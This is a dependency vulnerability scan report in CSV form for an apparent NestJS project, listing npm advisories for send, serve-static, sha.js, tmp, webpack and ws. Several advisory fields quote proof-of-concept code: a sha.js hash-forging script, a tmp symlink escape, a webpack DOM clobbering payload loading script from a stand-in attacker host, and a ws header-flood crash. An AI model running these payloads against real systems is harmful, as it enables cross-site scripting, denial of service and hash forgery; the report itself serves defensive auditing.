"Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CVSSv4_BaseSeverity","CVSSv4_BaseScore","CVSSv4","CPE Confidence","Evidence Count","VendorProject","Product","Name","DateAdded","ShortDescription","RequiredAction","DueDate","Notes"
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",send:0.18.0,/src/package-lock.json?serve-static:1.15.0/send:0.18.0,Better streaming static file server with Range and conditional-GET support,MIT,"","",pkg:npm/send@0.18.0,cpe:2.3:a:send_project:send:0.18.0:*:*:*:*:*:*:*,GHSA-m6fv-jmcg-4jfg,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Impact  passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code  ### Patches  this issue is patched in send 0.19.0  ### Workarounds  users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist  ### Details  successful exploitation of this vector requires the following:  1. The attacker MUST control the input to response.redirect() 1. express MUST NOT redirect before the template appears 1. the browser MUST NOT complete redirection before: 1. the user MUST click on the link in the template",NPM,"","","",MEDIUM,5.0,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",send:0.18.0,/src/package-lock.json?serve-static:1.15.0/send:0.18.0,Better streaming static file server with Range and conditional-GET support,MIT,"","",pkg:npm/send@0.18.0,cpe:2.3:a:send_project:send:0.18.0:*:*:*:*:*:*:*,CVE-2024-43799,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),Send is a library for streaming files from the file system as a http response. Send passes untrusted user input to SendStream.redirect() which executes untrusted code. This issue is patched in send 0.19.0.,NVD,"","","",MEDIUM,4.7,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N/E:1.6/RC:R/MAV:A,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",serve-static:1.15.0,/src/package-lock.json?/serve-static:1.15.0,Serve static files,MIT,"","",pkg:npm/serve-static@1.15.0,cpe:2.3:a:serve-static_project:serve-static:1.15.0:*:*:*:*:*:*:*,GHSA-cm22-4g7w-348p,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Impact  passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code  ### Patches  this issue is patched in serve-static 1.16.0  ### Workarounds  users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist  ### Details  successful exploitation of this vector requires the following:  1. The attacker MUST control the input to response.redirect() 1. express MUST NOT redirect before the template appears 1. the browser MUST NOT complete redirection before: 1. the user MUST click on the link in the template",NPM,"","","",MEDIUM,5.0,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",sha.js:2.4.11,/src/package-lock.json?typeorm:0.3.20/sha.js:^2.4.11,Streamable SHA hashes in pure javascript,(MIT AND BSD-3-Clause),"","",pkg:npm/sha.js@2.4.11,cpe:2.3:a:browserify:sha.js:2.4.11:*:*:*:*:*:*:*,GHSA-95m3-7q98-8xr5,CWE-20 Improper Input Validation,"### Summary  This is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.  Missing input type checks can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.  ### Details  See PoC  ### PoC ```js const forgeHash = (data, payload) => JSON.stringify([payload, { length: -payload.length}, [...data]])  const sha = require('sha.js') const { randomBytes } = require('crypto')  const sha256 = (...messages) => {   const hash = sha('sha256')   messages.forEach((m) => hash.update(m))   return hash.digest('hex') }  const validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever  const payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe') const receivedMessage = JSON.parse(payload) // e.g. over network, whatever  console.log(sha256(...validMessage)) console.log(sha256(...receivedMessage)) console.log(receivedMessage[0]) ```  Output: ``` 638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4 638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4 Hashed input means safe ```  Or just: ```console > require('sha.js')('sha256').update('foo').digest('hex') '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae' > require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex') '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae' ```  ### Impact  1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash. 2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`     This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js) 4. DoS on `{length:'1e99'}` 5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",NPM,"","","",CRITICAL,9.100000381469727,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",sha.js:2.4.11,/src/package-lock.json?typeorm:0.3.20/sha.js:^2.4.11,Streamable SHA hashes in pure javascript,(MIT AND BSD-3-Clause),"","",pkg:npm/sha.js@2.4.11,cpe:2.3:a:browserify:sha.js:2.4.11:*:*:*:*:*:*:*,CVE-2025-9288,"CWE-20 Improper Input Validation, NVD-CWE-noinfo",Improper Input Validation vulnerability in sha.js allows Input Data Manipulation.This issue affects sha.js: through 2.4.11.,NVD,"","","",CRITICAL,9.1,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H/E:3.9/RC:R/MAV:A,CRITICAL,9.1,CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:N/V:X/RE:X/U:X,HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",tmp:0.0.33,/src/package-lock.json?/tmp:0.0.33,Temporary file and directory creator,MIT,"","",pkg:npm/tmp@0.0.33,"",GHSA-52f5-9888-hmc6,CWE-59 Improper Link Resolution Before File Access ('Link Following'),"### Summary  `tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.   ### Details  According to the documentation there are some conditions that must be held:  ``` // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50  Other breaking changes, i.e.  - template must be relative to tmpdir - name must be relative to tmpdir - dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks  are still in place.  In order to override the system's tmpdir, you will have to use the newly introduced tmpdir option.   // https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375 * `dir`: the optional temporary directory that must be relative to the system's default temporary directory.      absolute paths are fine as long as they point to a location under the system's default temporary directory.      Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access,       as tmp will not check the availability of the path, nor will it establish the requested path for you. ```  Related issue: https://github.com/raszi/node-tmp/issues/207.   The issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579 function _resolvePath(name, tmpDir) {   if (name.startsWith(tmpDir)) {     return path.resolve(name);   } else {     return path.resolve(path.join(tmpDir, name));   } } ```  If the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`: ```js // https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609 function _assertIsRelative(name, option, tmpDir) {   if (option === 'name') {     // assert that name is not absolute and does not contain a path     if (path.isAbsolute(name))       throw new Error(`${option} option must not contain an absolute path, found ""${name}"".`);     // must not fail on valid .<name> or ..<name> or similar such constructs     let basename = path.basename(name);     if (basename === '..' || basename === '.' || basename !== name)       throw new Error(`${option} option must not contain a path, found ""${name}"".`);   }   else { // if (option === 'dir' || option === 'template') {     // assert that dir or template are relative to tmpDir     if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {       throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${name}"".`);     }     let resolvedPath = _resolvePath(name, tmpDir); //<---      if (!resolvedPath.startsWith(tmpDir))       throw new Error(`${option} option must be relative to ""${tmpDir}"", found ""${resolvedPath}"".`);   } } ```   ### PoC  The following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible. Tested on a Linux machine.  - Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it ```bash mkdir $HOME/mydir1  ln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir ```  - check the folder is empty: ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" ```  - run the poc ```bash node main.js File:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf test 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]' test 2: dir option must be relative to ""/tmp"", found ""/foo"". test 3: dir option must be relative to ""/tmp"", found ""/home/user/mydir1"". ```  - the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`): ```bash ls -lha $HOME/mydir1 | grep ""tmp-"" -rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id] ```   - `main.js` ```js // npm i tmp@0.2.3  const tmp = require('tmp');  const tmpobj = tmp.fileSync({ 'dir': 'evil-dir'}); console.log('File: ', tmpobj.name);  try {     tmp.fileSync({ 'dir': 'mydir1'}); } catch (err) {     console.log('test 1:', err.message) }  try {     tmp.fileSync({ 'dir': '/foo'}); } catch (err) {     console.log('test 2:', err.message) }  try {     const fs = require('node:fs');     const resolved = fs.realpathSync('/tmp/evil-dir');     tmp.fileSync({ 'dir': resolved}); } catch (err) {     console.log('test 3:', err.message) } ```   A Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links. ```js function _resolvePath(name, tmpDir) {   let resolvedPath;   if (name.startsWith(tmpDir)) {     resolvedPath = path.resolve(name);   } else {     resolvedPath = path.resolve(path.join(tmpDir, name));   }   return fs.realpathSync(resolvedPath); } ```   ### Impact  Arbitrary temporary file / directory write via symlink",NPM,"","","",LOW,2.5,CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",webpack:5.90.1,/src/package-lock.json?/webpack:5.90.1,"Packs ECMAScript/CommonJs/AMD modules for the browser. Allows you to split your codebase into multiple bundles, which can be loaded on demand. Supports loaders to preprocess files, i.e. json, jsx, es7, css, less, ... and your custom stuff.",MIT,"","",pkg:npm/webpack@5.90.1,cpe:2.3:a:webpack.js:webpack:5.90.1:*:*:*:*:*:*:*,GHSA-4vvj-4cpr-p986,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Summary  We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.  We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.   ### Details  #### Backgrounds  DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:  [1] https://scnps.co/papers/sp23_domclob.pdf [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/   #### Gadgets found in Webpack  We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript) /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.  ### PoC  Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.  Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:  ``` // entry.js import('./import1.js')   .then(module => {     module.hello();   })   .catch(err => {     console.error('Failed to load module', err);   }); ```  ``` // import1.js export function hello () {   console.log('Hello'); } ```  The webpack.config.js is set up as follows: ``` const path = require('path');  module.exports = {   entry: './entry.js', // Ensure the correct path to your entry file   output: {     filename: 'webpack-gadgets.bundle.js', // Output bundle file     path: path.resolve(__dirname, 'dist'), // Output directory     publicPath: ""auto"", // Or leave this field not set   },   target: 'web',   mode: 'development', }; ```  When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.  ``` <!DOCTYPE html> <html> <head>   <title>Webpack Example</title>   <!-- Attacker-controlled Script-less HTML Element starts--!>   <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>   <!-- Attacker-controlled Script-less HTML Element ends--!> </head> <script src=""./dist/webpack-gadgets.bundle.js""></script> <body> </body> </html> ```  ### Impact  This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.  ### Patch  A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :> /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",NPM,"","","",MEDIUM,6.400000095367432,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",webpack:5.90.1,/src/package-lock.json?/webpack:5.90.1,"Packs ECMAScript/CommonJs/AMD modules for the browser. Allows you to split your codebase into multiple bundles, which can be loaded on demand. Supports loaders to preprocess files, i.e. json, jsx, es7, css, less, ... and your custom stuff.",MIT,"","",pkg:npm/webpack@5.90.1,cpe:2.3:a:webpack.js:webpack:5.90.1:*:*:*:*:*:*:*,CVE-2024-43788,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. The webpack developers have discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Real-world exploitation of this gadget has been observed in the Canvas LMS which allows a XSS attack to happen through a javascript code compiled by Webpack (the vulnerable part is from Webpack). DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes. This issue has been addressed in release version 5.94.0. All users are advised to upgrade. There are no known workarounds for this issue.",NVD,"","","",MEDIUM,6.1,CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:2.8/RC:R/MAV:A,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",webpack:5.91.0,/src/package-lock.json?/webpack:5.91.0,"Packs ECMAScript/CommonJs/AMD modules for the browser. Allows you to split your codebase into multiple bundles, which can be loaded on demand. Supports loaders to preprocess files, i.e. json, jsx, es7, css, less, ... and your custom stuff.",MIT,"","",pkg:npm/webpack@5.91.0,cpe:2.3:a:webpack.js:webpack:5.91.0:*:*:*:*:*:*:*,CVE-2024-43788,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset. The webpack developers have discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Real-world exploitation of this gadget has been observed in the Canvas LMS which allows a XSS attack to happen through a javascript code compiled by Webpack (the vulnerable part is from Webpack). DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes. This issue has been addressed in release version 5.94.0. All users are advised to upgrade. There are no known workarounds for this issue.",NVD,"","","",MEDIUM,6.1,CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N/E:2.8/RC:R/MAV:A,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",ws:8.11.0,/src/package-lock.json?/ws:8.11.0,"Simple to use, blazing fast and thoroughly tested websocket client and server for Node.js",MIT,"","",pkg:npm/ws@8.11.0,cpe:2.3:a:ws_project:ws:8.11.0:*:*:*:*:*:*:*,GHSA-3h5v-q93c-6h6q,CWE-476 NULL Pointer Dereference,"### Impact  A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.  ### Proof of concept  ```js const http = require('http'); const WebSocket = require('ws');  const wss = new WebSocket.Server({ port: 0 }, function () {   const chars = ""!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~"".split('');   const headers = {};   let count = 0;    for (let i = 0; i < chars.length; i++) {     if (count === 2000) break;      for (let j = 0; j < chars.length; j++) {       const key = chars[i] + chars[j];       headers[key] = 'x';        if (++count === 2000) break;     }   }    headers.Connection = 'Upgrade';   headers.Upgrade = 'websocket';   headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';   headers['Sec-WebSocket-Version'] = '13';    const request = http.request({     headers: headers,     host: '127.0.0.1',     port: wss.address().port   });    request.end(); }); ```  ### Patches  The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)  ### Workarounds  In vulnerable versions of ws, the issue can be mitigated in the following ways:  1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent. 2. Set `server.maxHeadersCount` to `0` so that no limit is applied.  ### Credits  The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.  ### References  - https://github.com/websockets/ws/issues/2230 - https://github.com/websockets/ws/pull/2231  [`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize [`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener [`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,8,"","","","","","","",""
